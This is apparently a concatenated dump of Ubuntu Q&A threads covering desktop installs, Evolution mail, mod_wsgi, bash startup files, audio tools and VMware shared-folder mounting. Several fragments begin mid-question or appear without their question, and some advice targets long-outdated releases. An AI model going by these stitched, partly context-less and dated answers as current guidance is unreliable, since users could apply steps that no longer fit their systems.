Basically what I am looking for is the standard Desktop Ubuntu install, but with out all the word processing, multimedia, and games installed.\nI have seen posts out about how to get the desktop environment running on Ubuntu server, but they seem complicated, and never seem to equal the standard Desktop install.\nSo my question is, is there anyway to tell the standard Desktop install not to install all the applications?  Or is there a distro available that leaves all the applications out, and just has the standard desktop look and feel?\nWhat I really want this for is, is for development purposes to run on a VM to do Mono development.  \n\nA: As far as I know there isn't such a distribution, but you could install ubuntu-minimal using the alternate installer, or use the alternate installer to customize what you want installed on your system.\nAfter installing ubuntu-minimal you would be left with a command line install, but all you would have to do is run apt-get install gnome-desktop monodevelop to get what you are looking for.\n\nA: The ubuntu minimal cd's are available and can be found here\nhttps://help.ubuntu.com/community/Installation/MinimalCD\n\nA: Installing the gnome-core package should get you a pretty minimal environment.

However, it doesn't show the latest emails on the server. I can see them with other clients; just not Evolution.\nIs there a way to force Evolution to re-load the entire folder?\n\nA: There are several settings for an IMAP account you can make in Evolution. On first startup, or when you create a new account, or in case you already have an account by selecting Edit -> Preferences -> Mail Accounts -> account@provider -> Edit -> Receiving Options you will be presented the following options:\n\nThe settings given here make sure that all mails are displayed in Evolution. As soon as you check only subscribed folders, start to apply filters, or check for junk mails you risk that only part of your mails are displayed.\nOnly if there is no success with settings then as a last resort you may have to delete the local IMAP folder to force reloading as has already been suggested.\n\nA: To force evolution to reload the entire IMAP account is to delete the IMAP folder in the hidden evolution folder in your home folder while evolution is closed.\n\nAlternatively if you have multiple IMAP accounts you can go in to the IMAP folder and delete the folder pertaining to that account.\n\nThis will force evolution to reload the entire account.\nHope this helps.\n\nedit\nIt sounds as though the account has been set-up as a standard IMAP account as a posed to an IMAP+ account. What's the difference I here you say (because if your here you will need to know). \nIMAP+ in Evolution is an IMAP IDLE enabled account which means that the client can tell the server to immediately sync all mail meaning that manual or automatic periodic syncing are obsolete. \nWith this type of account you should see the email as soon as it has arrived with your server.\nDue to a bug that is now fixed in 2.32 (the standard version in 10.10 is 2.30.3) you need to check the \"Use idle if the server supports it\" option in the options tab.     \n\nA: I had exactly the same problem with Ubuntu 19.04 and Evolution 3.321.-12 using sustem online accounts.

New in natty though, you can now install libgl1-mesa-dri-experimental to get the experimental 3D driver. However, this is very much \"if it breaks you get to keep both pieces\", the developers don't want to get bug reports about it right now.\n\nA: It isn't a case of switching, nouveau is maturing in the kernel and it will be automatically selected by the kernel if no other driver is available.\nBut the binary nvidia driver is still preferred.

I'm trying to get Python working with Apache, however I'm failing to have success with either CGI or mod_python.\nDoes anyone know a good tutorial or something?\nThanks.\n\nA: mod_python is basically non-maintained - you should look into mod_wsgi. Install the package libapache2-mod-wsgi, then issue sudo a2enmod wsgi to enable it.\nJust as a quick example to get it running, stuff something like this in your /etc/apache2/sites-enabled/default:\nWSGIScriptAlias /test /path/to/python/file.py\n\nAnd in the file /path/to/python/file.py:\ndef application(environ, start_response):\n    start_response('200 OK', [('Content-Type', 'text/plain')])\n    return \"Hello World\"\n\nAfter re-starting Apache2, any request to /test will turn into a call of application() in your python file.\nFor further reading, look into WSGI (WebServer Gateway Interface), the way Python integrates with web-servers.\nBonus / Update:\nPython (unsurprisingly) has a small WSGI server in the standard library for testing. If you add this in the bottom of your file, you can run it as any old executable for testing purposes, and then let Apache take over for production:\nif __name__ == '__main__':\n    from wsgiref.simple_server import make_server\n\n    httpd = make_server('', 8080, application)\n    print \"Serving on http://localhost:8080\"\n\n    httpd.serve_forever()\n\n", "Q: Upgrading from a previous version of Ubuntu \nPossible Duplicate:\nWill there be data loss for upgrade? \n\nCan we upgrade a previous version of ubuntu to the latest version without losing data ?

I mean, there is a new version coming out every 6 months, so it will be convenient if we are able to upgrade without losing on the data . \n\nA: Yes. Upgrades do not erase your settings/data. You can run the command sudo do-release-upgrade in terminal to check for available upgrades. Run do-release-upgrade -h to see options, such as how to upgrade early (prior to release).\nAlso, if you know what you're doing, you can partition your hard drive to place your /home on its own partition.1 This enables you to wipe your install if anything goes wrong and reinstall without losing your settings/data.\n\nA: Just use the update manager. It will report if the new version is available. It won't destroy your data.\n\nA: You can safely update from within Ubuntu using the Update Manager though there is other options available, the following link to the Ubuntu website should provide you with enough info (though it details 10.04 to 10.10 it will be the same for 10.10 to 11.04).\n", "Q: Quota Exceeded but I only use 1.8 MB Everytime I start up, I get an error message from Ubuntu One that says I've exceeded my quota, but I'm only using 1.8 MB and I thought you got 2 GB.\nHow do I fix this?\n\nA: I had the same problem, with actually (0.0 MB) usage.

The emails that I moved show up, but when I try to check for new emails I get this message:\n\nSending of password did not succeed. Mail server pop.windstream.net responded:\n[IN-USE] account is locked by another session or for maintenance, try again.\n\nI click OK and another box pops up saying:\n\nLogin to server pop.windstream.net failed.\n\nWith 3 options:\n\n*\n\n*\"Enter new password\" (I'm SURE the one I'm typing is correct)\n\n*\"Cancel\"\n\n*\"Retry\"\n\nI've tried all 3.  Retyping my password, clicking \"Retry\", same result.\nWhile I was typing this, I got a toast that said:\n\nThunderbird's attempt to connect to pop.windstream.net has timed out.\n\nWhat is causing this and how can I fix it?\n\nA: The reason for my migration was a virus on the Windows machine.  As it turns out, the virus was automatically sending email.  A pop server can only handle one client at a time so I was prevented from accessing the account on another machine.  Unplugging the infected machine's internet cord solved the problem.\n", "Q: How to get Ubuntu guest VM to recognize second VirtualBox monitor? Now that VirtualBox supports multiple monitors for guests, I decided to try it out with Ubuntu 11.04 Alpha3 (i386) as a guest.\nUnfortunately, the second screen stays black and I can't even get xrandr to see the other display.\nIs there some way of getting this feature to work?\n\nA: I finally figured out how to get it working - I had to install:\nsudo apt-get install virtualbox-ose-guest-x11\n\n...and restart. The VM didn't boot the first time, but a hard reset seemed to sort things out.\nNote: at first, Natty assumed I wanted to clone the displays... but a quick trip to System->Preferences->Monitors was able to fix that.\n\nA: Multiple monitor setup of Virtual Box requires the installation of Guest Additions in the guest OS.\nMostly depending on the graphic card there may still be some issues with Virtual Box and Compiz/Unity in 11.04. Make sure you download and run the most recent version of Virtual Box. \nIf Unity/Compiz still won't run you can try to run Ubuntu 11.04 in a multiple monitor setting by choosing Ubuntu Classic Desktop (no effects) on login.\n", "Q: Which mailx package should I install for Nagios?

I know quickly is supposed to make life easier for developers of all kinds, I'm just curious as to if there is an IDE for quickly (something like QtCreator or Monodevelop)?\nIf not, as a part B, is there one on the way?\n\nA: Hope my answer comes on time, I just tested and you can use PyDev from eclipse.\nBasically you first need to create your Quickly application as shown in the examples, then create a project in eclipse with PyDev (I used the same name) and set the location of your Quickly application as the project location. To be able to launch the project from Eclipse, rename the executable script called  in the bin/ folder to something like *_launcher.py* (the name must differ from the module with the rest of the code).\nNow, one nasty piece of work is to make the schema settings work (a bug about this is filed). First, to move automatic compiling from the quickly run script to *_launcher.py* append this code to the end of the file, right before the import  command:\n### BEGIN inserted from Quickly's run.py\n# Compile schema if present\nschemapath = os.path.abspath(\"data/glib-2.0/schemas\")\nif os.path.exists(schemapath):\n    subprocess.call([\"glib-compile-schemas\", schemapath])\n### END\n\nThen to tell the application to look for schemas locally as well you have to edit the PyDev launch configuration and in the Environment tab add a variable XDG_DATA_DIRS with a value\n/usr/share/ubuntu:/usr/share/gnome:/usr/local/share/:/usr/share/:/path/to/your/project/data\n(adjust to match your project path)\nYou'll be able to modify any files and test if it works and even debug the program, and you can still use normal commands from quickly.\nIn my case, I already had the bazaar plugin installed in the eclipse enviromnent and I can see which files I need to commit and so on.\n\nA: Following the bug report in the post by jmolinaso above there now seems to be an even easier way to run your Quickly application from the command line and set the ./bin/APPNAME file as the Main Debug file in Wing IDE.\nIf had trouble reading the notation in Patch for bug 976817 then this is a way to look at it: In your shiny folder you have a \"bin\" folder, with only one file with your application name. We can call it /bin/APPNAME. In the file APPNAME you need to add a couple of lines between: sys.path.insert(0, PROJECT_ROOT_DIRECTORY) and:  if python_path:\nThe lines to be included are marked with a + in the patch mentioned above.\nSo just copy paste as follows:\nAfter: sys.path.insert(0, PROJECT_ROOT_DIRECTORY) add:\n    datadir = os.path.join(PROJECT_ROOT_DIRECTORY, \"data\")\n    if 'XDG_DATA_DIRS' in os.environ:\n        os.putenv('XDG_DATA_DIRS', \"%s:%s\" % (datadir, os.getenv('XDG_DATA_DIRS', '')))\n    else:\n        os.putenv('XDG_DATA_DIRS', datadir)\n\nLeave the orignal:  if python_path: and what follows, where it is. Also, please note the indents above, this should be indented with four spaces).\nNow you can start your application from the command line, set ./bin/APPNAME as the main debug file in WingIDE (or any other IDE I suppose) and work with you Quickly app as you would with any other application, start/stopping the debugger from WingIDE, for instance. Quickly run will also still work from the command line.\n\nA: The short answer is no.\nA quickly edit command will open all python files in your default editor. You can however use your preferred editor or IDE for development.\n", "Q: Evolution - exchange-connector, Rackspace global catalog server I'm (trying to) switch to Ubuntu from Windows XP on my work laptop.

I have a Windows XP machine synced up using Outlook 2007, so if I need to gather any information from that setup I can.\n\nA: The Global Catalog Server name can be found in your outlook Names\nSteps below\n\n\n*\n\n*Open a new email message in Outlook.\n\n\nthen\n\n\n*\n\n*Click on the \"To:\" button to get the\n\"Select Names\" dialog\n\n\nthen\n\n\n*\n\n*Put \"Show Names from the\" to \"Global\nAddress List\".\n\n\nfinally\n\n\n*\n\n*Right-click on the \"Global Address\nList\" to get \"Properties\"\n\n\nThis opens a dialog with the name of the Global Address List server and the path.

Is it possible to disable the the new resize gripper that shows up in Ubuntu Natty/11.04?\n\n\nA: It is possible to resize grippers or hide them by setting width and height to a zero.

I just installed Ubuntu 10.10 Netbook Remix on my HP Mini 1000. Everything worked fine right up until I tried typing - apparently the left and right arrow keys on my keyboard are uncontrollable. Everything I type ends up looking messed up because the left and right keys keep automatically inserting themselves into everything I type.\nThis also happens when I click on, say, \"File\" on Firefox. It starts rotating between all the different menu options even though I'm not pressing anything on the keyboard.\nDoes anyone have any idea what's going on? Is this a problem with the keyboard itself?\n\nA: I think its an issue with the hardware. But you may also check 'Applications' > 'Keyboard' (under System).\nThere you can check the configuration and see if there is anything making your arrow keys go crazy (though I guess You have tried that already).\nAlso here is what I might have done; flip the netbook upside down and give it a little hard pat right behind those arrow keys. It might fix if there is something stuck in those nerdy keys of yours (CAUTION: THIS WAY IS SOMETHING WHICH I AM TELLING YOU AND NOT SUGGESTING OR RECOMMENDING. DO IT AT YOUR OWN WILL)\nOne way how you can ensure if its a hardware issue is that you can try Ubuntu or any other OS on this netbook of yours by booting it off a USB Stick.

I am on Ubuntu 10.10.\nCan somebody give me the command line that I could use in the application launcher appearing when Alt + F2 are hit ? Or any other solution in order to recover the applet on the gnome-panel ?\n\nA: As long as you didn't tell the panel to \"delete\" the clock applet, you should be able to get it back with a simple restart of the gnome-panel itself.

It doesn't allow to actually fill PDF forms, but if writing text / drawing on top of your PDF is enough for you, you may find it useful.\nYou can install it from the Ubuntu software.\nTo install from terminal, use the following command:\nsudo apt-get install xournal\n\nNote: Xournal is not anymore actively developed.

I was able to clearly see which fields and checkboxes can be filled and I was able to save the document with my modifications. It's just the amount of garbage documents and other users reliance on a proprietary application (with a deprecated and unsafe feature set) which make me occasionally doubt in which time we live in.\nIt's a solved problem.

I want to put new aliases to my .bash_profile file, but I cannot find this file.\nWhere is it supposed to be?\n\nA: You do not usually have .bash_profile on Ubuntu, nor should you usually create that file. As jpezz says, it would be in your home directory on your Ubuntu system, which is what ~ stands for, and you can create it there. But if you do, you should be careful, because it will prevent bash from automatically running the commands in .profile--which you almost certainly do have.\nWhen bash runs as a login shell, in WSL or otherwise1, it runs the first of .bash_profile, .bash_login, or .profile that exists in your home directory. If you have bash-specific commands that you want to run when you log in--but only when bash is your shell--you could put them in .bash_profile. But the mere existence of .bash_profile would prevent .profile from being used.\nSo then you would want to source .profile from .bash_profile, assuming you wanted those commands to be run too, which you almost always would. You could do that by putting this command in .bash_profile:\n. ~/.profile\n\n(Some readers may be accustomed to seeing that written as . \"$HOME/.profile\" when it appears in a startup script. That's always fine--and you may prefer to use that for commands that need to work on shells other than bash too, if you need to accommodate extremely old shells that don't support standard features, which--well, you don't need that. In any case, bash always supports tilde expansion and the point of .bash_profile is that only bash runs commands from it, so . ~/.profile is fine.)\nThe . builtin sources a file, which is to say it runs all the commands from the file in the current shell. Open an interactive bash shell and run help . for more information.\nThe reason you don't usually have .bash_profile on Ubuntu even if you have bash-specific commands that you want to run on login is that, by default, users' .profile files contain code that checks if the current shell is bash, then causes such commands to be run.\nThere is another answer to the question of where files like .profile or .bash_profile are. The default versions of these files exist in the /etc/skel directory. Files in that directory are copied into the Ubuntu home directories when user accounts are created on an Ubuntu system--including the user account you create as part of installing Ubuntu. If you look in that directory, you'll notice that there is a file called .profile--as well as some other files like .bashrc--but there is no file called .bash_profile. That is why--or, really, how--no .bash_profile exists in your Ubuntu home directory unless you have created it yourself.\n\nFinally, you should not put aliases in .profile at all, nor is .bash_profile a good place for them, as geirha rightly says. This is because you will want your aliases to work in interactive shells whether or not they are login shells. Instead, define your aliases in .bashrc or, better, .bash_aliases (as guest boeroe points out), which the default .bashrc sources. See How do I create a permanent Bash alias?\nThe default .profile file will check if you are running a bash shell and source .bashrc if you are:\n# if running bash\nif [ -n \"$BASH_VERSION\" ]; then\n    # include .bashrc if it exists\n    if [ -f \"$HOME/.bashrc\" ]; then\n    . \"$HOME/.bashrc\"\n    fi\nfi\n\nMeanwhile the default .bashrc will quit at the top without doing anything if it runs in in a non-interactive shell, so commands in it won't run if it gets sourced by .profile in a non-interactive login shell and in other more obscure scenarios2:\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\nSo if you put aliases in .bashrc or in .bash_aliases, you'll get them for interactive login shells (where .profile is used) as well as interactive non-login shells (where .bashrc is used). This is what you want. Just don't put anything above the interactivity check, unless you really, really know what you're doing.\n\n1 This answer was originally written for a WSL-related question, but that question has been closed as a duplicate and this answer applies fully here as well, so I've expanded a bit and posted it here instead.\n2 When bash detects that it is probably running as the initial shell of a remote login that is not a login shell--such as when you use ssh to run a single command on a remote machine--it runs commands from .bashrc. (See 6.2 Bash Startup Files in the GNU Bash manual.)\n\nA: It's a hidden file, located in your home folder:\n~/.bash_profile\n\n(the ~ expands to your home directory. If your username is user, the result would be: /home/user/.bash_profile).\nSince it's an hidden file, you have to make it visible.\nTo do it in Nautilus go to the \"View\" menu and check \"Show hidden files\" (or press the shortcut Ctrl + H).\nIf you are using Kubuntu with Dolphin, you have to press Ctrl + . to toggle the visibility of files.\n\nA: It is handy to put all your alias in ~/.bash_aliases in the user home directory. That is what is suggested in the ~/.bashrc file in the comments.\n\nA: ~/.bash_profile is not the right place to put aliases and functions. They should go in ~/.bashrc. See http://mywiki.wooledge.org/DotFiles for an explanation.\n\nA: just wanted to chime in - that even files are hidden in viewer you can still open all of them if you just enter name of the file. For example, if you write in dolphin address bar /home/<user>/.bashrc it will open the file with default editor without toggling show/hide some files.\nOther way is to just open your favorite editor and just type in the name of file.\nI see that as most preferred way to handle hidden files as showing not showing just add to noise that can be avoided.\nAnd aliases should go into .bashrc as geirha wrote.\n", "Q: How can I use smbclient to connect to Windows shares by hostname when a firewall is enabled?

After you've made the change you want you can do a bzr commit and then you need to build Unity to test it:\n\n\n*\n\n*How do I build Unity from source?\nYou don't have to follow the part of the instructions where you pull unity from Launchpad, you've already done that.\nAfter you've fixed what you want you can submit the branch to Launchpad if you want the Unity folks to integrate it. \nWe have a page full of bitesize bugs for people who are just getting started if they want to tackle something small to get used to the codebase.\n\n\n*\n\n*IRC Logs from a tutorial session.\n\n*How to contact the Unity team.\n\n\nIf you have specific questions about parts of the unity code just ask them as new questions and tag them with unity and Unity developers will look at them, it will be useful to start building up a bunch of questions and answers about the Unity codebase!\n\nA: You can find several ways of getting involved in Unity's development here: http://unity.ubuntu.com/getinvolved/\nYou don't need a VM, you can run Unity from your development directory without replacing your system files.  And of course you can join #ubuntu-unity on freenode to talk to the other developers.\n", "Q: The side usb ports don't work on my Apple Wired Keyboard I'm trying to use my Apple Wired Keyboard's usb ports, however ubuntu refuses to pick up anything and dmesg doesn't tell me anything either.\nMany thanks will be appreciated,\nJoe\n\nA: This sounds like it might be a hardware problem.

I get a \"Monitor is not a valid keyword\" in this subsection\n\nA: Just plug in a monitor, and the monitor will mirror what the laptop screen ought to be showing. You can use System -> Preferences -> Monitors to get the resolution right, and turn off the laptop screen (so Ubuntu doesn't try to render everything twice).\n\nA: Ctrl+Alt+F1 should get you into a terminal. In there, install openssh-server so you can log into the machine from the network, which will be more comfortable:\nsudo aptitude install openssh-server (from memory)\n\nThen, log in locally (you will lose your screen initially).\nAlso, log in remotely via ssh.\nSet your remote ssh session environment so you can affect the X server:\nexport DISPLAY=:\n\nNow you can play around with variations on xrandr --auto etc on the remote ssh session, and you will be driving your desktop login. For example:\nxrandr -q\n\n... which should tell you the current status.\nxrandr --auto\n\n... which might Just Work. Or maybe (as a guess from memory)\nxrandr --output LVDS1 --off --output VGA1 --auto\n\nGood luck ;-)\n", "Q: What is the best way to record audio into my desktop? I asked yesterday about how to configure Audacity, which I found out doesn't work right with Pulse Audio. I have since removed them and am looking for the best way to set up a DAW on my desktop.\n\nA: I use a variety of programs depending on what I am trying to achieve and how hard I want to work with it. You can install any of them from Software Center or using apt-get\nAudacity - Simple recording and editing.  If you are doing a couple of tracks and generating stereo output, this will work.\nRosegarden - This is my bread and butter when I come down to working with MIDI files and doing sequencing.  I use a MIDI keyboard for entry, QSynth (fluidsynth) as the playback MIDI device(s), and Rosegarden to do the capture and editing of the MIDI.  It also supports capturing and playing back audio along with the MIDI, as well as the production of sheet music from the MIDI, but it is not what I would call a real digital audio mixing console.\nRosegarden uses JackD.\nArdour - When I want to delve into the word of digital audio (re)mixing, this is what I reach for.  Multi-channel, multi-bus, supports per-channel digital effects plugins, and has a bit of a learning curve.  IMHO, it compares well with Pro-Tools(tm), but I have only seen pro-tools used and found I could do the same with Ardour.  One session I did with this ended with 5.2 mix down with separate L/R/C front, L/R rear, and sub channels.  The original source was recorded from playback Rosegarden (I told you I used all of these for different things!) and then mixed.\nArdour uses JackD.\nPulse Audio\n[Warning, this is pure opinion and rant....]Pulse audio and any serious sound work do no mix.  I don't do serious sound work, but I run 3 sounds cards in my machine.  I had them running very well under ALSA (yes, it took a bit of work).  When Ubuntu shoved Pulse Audio down my throat, I spent several long nights trying to get things happy again and get the right sound card mapped to the right place.  I then finally uninstalled Pulse Audio, and reverted to my ALSA setup and could get things going again. YMMV\n\nA: Rosegarden (Click To Install)\n\nRosegarden is a well-rounded audio and MIDI sequencer, score editor, and general-purpose music composition and editing environment.\nRosegarden is an easy-to-learn, attractive application that runs on Linux, ideal for composers, musicians, music students, and small studio or home recording environments.\n\n\n\nA: Ardour\nArdour is a digital audio workstation (graphical gtk2 interface). You can use it to record, edit and mix multi-track audio. You can produce your own CDs, mix video soundtracks, or just experiment with new ideas about music and sound.\n\nA: This list lacks a command line tool. The preinstalled alsa-utils provide the arecord tool, which can be used to record audio with a command as simple as:\narecord -f cd output.wav\n\nTo get a mp3, just pipe the output through lame:\narecord -f cd | lame - output.mp3\n\nOf course, arecord also has a bunch of options to configure it exactly how you want, e. g. -d for the record duration and -r for the sampling rate (the above used -f cd sets -r 44100), read more at arecord's manpage. The same applies to lame: lame's manpage.\nTo edit the recorded audio on the command line the libav-tools can be used, especially the powerful avconv.

My Ubuntu 9.10 cd boots just right, but the new one not.\nWhat else can be? Or what more precise tests can I make to discover where's the problem? \n--More info\nWhat happens when I try to boot with the Ubuntu 10.10 cd is that it behaves like there's no bootable cd in the drive. It just don't find the boot on the cd, and start the HD system.\nMy notebook is an Amazon PC Intel Celeron 1.5 with 2Gb memory, a DVD-RW driver, HD samsung with 260GB.\n--update\nIf you put the media agains the light and see the other side, does that means that it's a bad quality dvd media? (it's a Philips)\n\nA: As Allan suggests, some more info would be helpful, but I'll post some suggestions here, as I can't \"comment\" at the moment.\n\n\n*\n\n*Have you definitely set the CD drive higher than the HDD in the BIOS boot settings?\n\n*Can you boot a different CD?\n\n*If the CD is booting, but crashing with some form of kernel panic, you can try the various options in the CD menu (like ACPI=off, which is needed on some models of laptop, such as the Toshiba Satellite)\n\nA: one of the possible problem is if the file is not downloaded properly. The easy check is to calculate sha or md5 checksum and compare it with the original placed on the site you downloaded from.\nthe other problem can be if you burnt the ISO as a file not as an image\n\nA: If you boot your computer with... anything bootable, and then you insert the 10.10 CD you burned, is it recognized and mounted (i.e. is it readable)? \nIf not, and you have an Ubuntu distro running, you can test with wodim -atip and wodim -toc (they are in Ubuntu package wodim, the old cdrecord) whether the CD media is recognized as writable and if there are tracks.\nIf it is recognized, there is another package that can help you, cdck: it can tell you what's the content of that CD and if it's bootable. E.g. with a Knoppix CD that I burned myself I get:\nTry to find out what sort of CD this is...\nCD-ROM with iso9660 fs\niso9660: 688 MB size, label 'KNOPPIX'\nCreating software: 'KNOPPIX'\nbootable CD  \n\nThis won't probably answer to your question 'why', but it should help you track where is the cause of the problem.\n\nA: At what speed did you burn the CD?  I have had problems with bootable CD's not booting, but when I burn the same ISO image to a CD at the lowest speed that the drive offers, the new CD will boot.  Since your CD doesn't boot in two machines, but other CD's do, you really have to suspect the CD that you have burnt.  Making another will take a few minutes, but if it solves the problem... you have a coaster, and a new bootable CD! \n\nA: Simple check, have you enabled boot from CD/DVD rom in your bios settings. \nAs your computer boots up \nyou need to press\nDel\nor \nF1\nNavigate to boot options and select boot from DVD CD rom\n", "Q: OpenOffice Presentation change slide by clicking slides Is it possible to change slides in dual screen mode by clicking the slide on the left monitor? For instance, if the slide view is on the left screen, and the full-screen is on the right screen. I could do this on windows, but cannot see how to do this with Ubuntu.\n\nA: I'm pretty sure that one way to do this is to show the same image in both monitors - if that would work for you.  I have recently switched from Open Office to Libre Office on my machine that has a second monitor attached.  The version of Impress in Libre Office certainly works this way.  \nHowever, another interesting option offered by Libre Office is the add-on \"presenter console\".  This let you show the main presentation on the second screen (or LCD projector) and, on the main screen, shows the current slide, a mini-view of the next slide, some timing information (clock, presentation run time), previous/next buttons, a button to access any speaker's notes, etc.  All this - but - you can't change the slide by clicking on the image; you have to use the next button.  And, I don't think that you can use the mouse to point to something on the presentation screen in this mode. \n", "Q: Video files (AVI) tags editor? I would like to change tags of ordinary video files (AVI container).

It's a mobile workstation class laptop and it has a pointer that works with Ubuntu.\nThere are articles on the web detailing Elitebook compatibilities with Ubuntu, (I haven't found support yet for the fingerprint reader). Installing Ubuntu with this computer, as I understand, does not void the manufacturers warranty as with some other laptops.  The warranty (including drop warranty) and services are both superb.  Additionally, the computer comes with Windows XP installed by default and the option to install a Windows 7 Professional provided with CD.\nI posted this \"unboxing\" video on YouTube featuring the Elitebook 8540W.\nhttp://www.youtube.com/watch?v=KePyCr1uAYw&tracker=False \n\nA: I have a Dell Latitude E6510.  I and several of my coworkers are running Ubuntu on it (10.04, 10.10).   \nWe aren't running Kubuntu specifically, but the support for the input hardware should be identical.   \nUbuntu integration is great, and it's a pleasure to use.  Fast, tough, and the best-looking Dell I've used. The only important configuration I've had to do manually is settings up the various touchpad/keyboard mouse-click emulation buttons.  (I'm not sure what to call them, but you'll see them on the attached picture.)\nI like it better than the System76 system I have that's about the same age. \nDownside is that this one was Windows7 by default.\n\n", "Q: How do I mount shared folders in Ubuntu using VMware tools? Experts. I've successfully installed VMware tools for Ubuntu. Everything seems to work fine, but shared folders were not mounted automatically.\nHow do I get them to work?\nIf I run vmware-hgfsclient in terminal, I get the list of shared folders, but ls -l /mnt/hgfs is empty. Actually there's no hgfs dir in /mnt. I know I should probably use the vmware-hgfsclient tool, but I realy don't know how. \nP.S. I wouldn't ask if I could understand the vmware-hgfsclient help I've read. \nAny suggestions?\n\nA: I had a similar problem. The folder /mnt/hgfs/ appeared back again when I assured that open-vm was uninstalled. As follows\nsudo apt-get purge open-vm-tools\nsudo apt-get purge open-vm-tools-dkms\n\nand reinstalled vmware-tools\n\nA: I had this exact problem. It turned out IT had installed some old version of VMWare tools with non-functioning vmhgfs kernel module.\nMy solution was to run the configuration with the clobber-kernel-modules setting to overwrite the existing vmhgfs module.\n sudo vmware-config-tools.pl -d --clobber-kernel-modules=vmhgfs\n\nThe -d selects all the defaults for you (remove it if you don't want the defaults).\n\nA: open-vm-tools would NOT build kernel modules until I first installed linux-headers-virtual (paired with linux-image-virtual of course). as soon as I installed the headers package, dpkg-reconfigure open-vm-tools resulted in successfully building and loading the kernel modules, specifically the vmhgfs module.\n\nA: vmware-tools-patches worked for me; give this a  shot if nothing else works\n\nI've tested this on a fresh install (easy install) of ubuntu 16.10 on vmware workstation 12 pro\n\n\n\n*\n\n*Go to https://github.com/rasa/vmware-tools-patches\n\n*Follow the Quickest Start instructions given there.

If you call that without any options it will print some help that shows you how to call this as part of the `mount' command. Using that info I then ran the following which worked for me:\ncd /mnt\nsudo mkdir win7share\nsudo mount -t vmhgfs .host:/win7share /mnt/win7share\n\nI was then able to access the Win 7 share and copy files to and from there. \nIf you want to make this permanent then I suspect that you will need to edit the /etc/fstab file but I can't help you there yet.\n\nA: You need to install the VMWare tools first, after that the vmware-config-tools can be used globally. For a more detailed guide, you can see here.\n\nA: run vmware-config-tools.pl, AGAIN!\nRefer: http://www.laotudou.com/vmware-player-share-folder.html\n\nA: (applies to Mac VMware Fusion and Ubuntu file sharing)\nWhen you are asked in vmware-config-tools.pl about whether you want HGFS, say yes!

For Ubuntu 18.04 (or recent Debian distros), try:\nsudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000\n\nIf the hgfs directory doesn't exist, try:\nsudo vmhgfs-fuse .host:/ /mnt/ -o allow_other -o uid=1000\n\nYou may have use a specific folder instead of .host:/. In that case you can find out the share's name with vmware-hgfsclient. For example:\n$ vmware-hgfsclient\nmy-shared-folder\n$ sudo vmhgfs-fuse .host:/my-shared-folder /mnt/hgfs/ -o allow_other -o uid=1000\n\nIf you want them mounted on startup, update /etc/fstab with the following:\n# Use shared folders between VMWare guest and host\n.host:/    /mnt/hgfs/    fuse.vmhgfs-fuse    defaults,allow_other,uid=1000     0    0\n\nI choose to mount them on demand and have them ignored by sudo mount -a and the such with the noauto option, because I noticed the shares have an impact on VM performance.\nRequirements\nSoftware requirements may require installing the following tools beforehand:\nsudo apt-get install open-vm-tools open-vm-tools-desktop\n\nOthers have claimed the following are required:\nsudo apt-get install build-essential module-assistant \\\n  linux-headers-virtual linux-image-virtual && dpkg-reconfigure open-vm-tools\n\nOfficial Article\nHow to configure VMware Tools Shared Folders Linux mounts (60262)\n\nA: [UPDATE 2017-05-18] This answer is outdated for Ubuntu newer than 15.10 (Wiley). The executable vmware-hgfsmounter has not been available in Ubuntu since 16.04LTS (xenial). Although, hgfsmounter may still be available on other Linux distributions, since the hgfsmounter function is still currently available in the upstream source code on GitHub. If anyone has updated information, please comment or edit this answer, instead of down-voting, as I believe this answer may still be valid for older Ubuntu releases.\nThis answer also assumes that you are not using VMWare Tools from VMWare but instead using open-vm-tools from your Linux distribution. VMWare decided to support this switch in 2015. See KB2073803. Therefore this answer also assumes that your version of Ubuntu can install the open-vm-tools from it's software repository.\nOUTDATED FOR UBUNTU > 15.10 (Wiley)\nThis worked for me using open-vm-tools from Ubuntu Software Center (trusty-14.04LTS shown - please see update above):\ncd /mnt\nsudo mkdir hgfs\nsudo vmware-hgfsmounter .host:/`vmware-hgfsclient` /mnt/hgfs\n\nassuming of course that I had already enabled a shared folder from the host machine in VMware Player settings.\nNote that vmware-hgfsclient returns the list of shared folders that are enabled in the VMware Player settings. This function is available for both open-vm-tools and vmware-tools.\nAlso note that vmware-hgfsmounter is equivalent to\nmount -t vmhgfs .host:/win7share /mnt/hgfs\n\nor to adding to your /etc/fstab file\n.host:/win7share /mnt/hgfs vmhgfs defaults 0 0\n\nBut the vmware-hgfsmounter function is not available using the official vmware-tools from VMware that ships with the current VMware player. Therefore, as the currently accepted answer suggests, running the vmware-config-tools.pl -d fixes the problem.\n\nA: I have set up on Windows 7 host with  Ubuntu 11.04 Desktop with VMware Tools installed on.\nVirtual Machine settings\n\n\n*\n\n*Folder sharing = Always Enabled\n\n*Make sure you have at least one Folder shared between the host and guest\n\n\nOn the Ubuntu Guest\n\n\n*\n\n*check /mnt/hgfs that you can access your shared folder.\nIf you don't see your shared folders (automounted) inside /mnt/hgfs , run VMware configuration tools:\nsudo vmware-config-tools.pl\n\n*update your fstab using the details below:\ngksu gedit /etc/fstab\n(I am using ubuntu desktop so use other text editor to enter the next line at the end of the file)\n.host:/{shared-folder} /{path-to-mount-on} vmhgfs defaults,ttl=5,uid=1000,gid=1000   0 0\n\n*Restart your vm (You may need to restart few times or get error message saying unable to mount just skip the error and restart)\n\nA: VMWare: 15.5.0 build-14665864\nWindows 10 host, guest OS in the virtual machine; Ubuntu 20.04\n\n$ tail -n 1 /etc/fstab \nvmhgfs-fuse     <-fill-in-echo-$HOME-here>/shares fuse    defaults,max_write=32768,allow_other         0    0\n$ mkdir -p $HOME/shares && sudo mount shares\n\nMake sure that the fstab line has max_write defined as above\n( I had trouble with higher values,\n  you might even be safer with 32767 as that is the highest possible value in 15 bits ).\nThe name of the folder you have defined as \"share\" in VMWare settings (for the current VM) will appear as a sub-folder in ~/shares/ .\n(Windows 10 host, used here - when this was found to be necessary)\n\nA: A workaround for this problem is to edit 'inode.c' and change the line '888' to remove 'compat_truncate' function call (that is responsible for this problem on kernels 3.8.x). This file is inside 'vmware-tools-distrib', so you need to perform the following steps:\nExtract VMWare-Tools (probably you will get a folder called vmware-tools-distrib).\nThen:\n cd /vmware-tools-distrib/lib/modules/source\n tar xf vmhgfs.tar\n cd vmhgfs-only/\n sudo gedit inode.c\n\nGo to line 888: \n result = compat_vmtruncate(inode, newSize);\n\nAnd change it to: \n result = 0;\n\nThen save the file and exit gedit.\n cd ..\n rm -rf vmhgfs.tar\n 